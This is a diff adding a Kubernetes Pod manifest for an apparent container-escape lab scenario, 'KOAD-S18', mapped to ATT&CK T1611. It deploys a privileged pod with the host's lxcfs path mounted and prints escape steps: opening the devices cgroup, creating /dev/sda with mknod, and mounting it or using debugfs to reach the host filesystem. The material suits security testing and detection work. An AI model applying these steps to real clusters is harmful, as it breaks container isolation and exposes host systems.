@@ -1,0 +1,51 @@
+# KOAD-S18: lxcfs Escape
+# ATT&CK: T1611 — Escape to Host
+# Attack: Abuse lxcfs devices.allow → mknod + debugfs → host filesystem access
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape-lxcfs
+  namespace: koad
+  labels:
+    koad-scenario: S18
+    mitre-attck: T1611
+    escape-method: lxcfs
+spec:
+  containers:
+    - name: attacker
+      image: ubuntu:22.04
+      command: ["sh", "-c"]
+      args:
+        - |
+          echo "=== KOAD-S18: lxcfs Escape ==="
+          echo ""
+          echo "Prerequisites: lxcfs mounted on host"
+          echo ""
+          echo "Attack steps:"
+          echo "  1. Check if devices cgroup is writable:"
+          echo "     cat /sys/fs/cgroup/devices/devices.allow"
+          echo ""
+          echo "  2. Allow all devices:"
+          echo "     echo 'a' > /sys/fs/cgroup/devices/devices.allow"
+          echo ""
+          echo "  3. Create block device:"
+          echo "     mknod /dev/sda b 8 0"
+          echo ""
+          echo "  4. Mount and access host filesystem:"
+          echo "     mkdir /mnt/host"
+          echo "     debugfs /dev/sda"
+          echo ""
+          echo "  5. Or mount directly:"
+          echo "     mount /dev/sda /mnt/host"
+          sleep infinity
+      securityContext:
+        privileged: true
+      volumeMounts:
+        - name: lxcfs
+          mountPath: /var/lib/lxcfs
+  volumes:
+    - name: lxcfs
+      hostPath:
+        path: /var/lib/lxcfs
+        type: DirectoryOrCreate
